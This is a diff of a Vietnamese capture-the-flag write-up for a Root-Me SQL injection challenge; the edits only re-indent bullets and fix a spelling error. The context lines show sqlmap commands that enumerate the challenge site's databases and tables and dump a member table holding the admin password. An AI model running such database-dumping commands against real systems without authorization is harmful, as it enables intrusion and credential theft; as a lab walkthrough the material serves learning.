@@ -5,8 +5,8 @@
 
         python3 sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC" --dbs  
         
-          - Trong ngoặc kép là phần URL cần được khai thác.  
-          - ``--dbs`` là để lấy dữ liệu từ database.  
+      - Trong ngoặc kép là phần URL cần được khai thác.  
+      - ``--dbs`` là để lấy dữ liệu từ database.  
 
 ![image](https://user-images.githubusercontent.com/125866921/231939709-bbaea358-9c88-4e36-afb2-504615a433dc.png)
 
@@ -16,8 +16,8 @@
 
         python3 sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC" -D public --tables
         
-          - ``--tables`` được sử dụng để lấy các bảng.  
-          - ``-D public`` dùng để lấy kết quả trong `database public``.  
+      - ``--tables`` được sử dụng để lấy các bảng.  
+      - ``-D public`` dùng để lấy kết quả trong `database public``.  
 
 ![image](https://user-images.githubusercontent.com/125866921/231940117-c952c875-b154-4bdf-b669-4ec6d5e3093b.png)
 
@@ -25,10 +25,10 @@
 
         python sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC" -D public -T m3mbr35t4bl3 --dump  
         
-          - ``-T`` là chỉ vào bảng cần lấy dữ liệu.  
-          - ``--dump`` là lấy toàn bộ dữ liệu của bảng.  
+      - ``-T`` là chỉ vào bảng cần lấy dữ liệu.  
+      - ``--dump`` là lấy toàn bộ dữ liệu của bảng.  
 
 ![image](https://user-images.githubusercontent.com/125866921/231940471-103a7248-6c9c-4f2d-bf7c-98f11d646dee.png)
 
   - Kết quả trà về ta thấy có 1 tài khoản ``admin``.  
-  - Mật khảu của tài khoản cũng chính là flag mà ta cần tìm.  
+  - Mật khẩu của tài khoản cũng chính là flag mà ta cần tìm.  
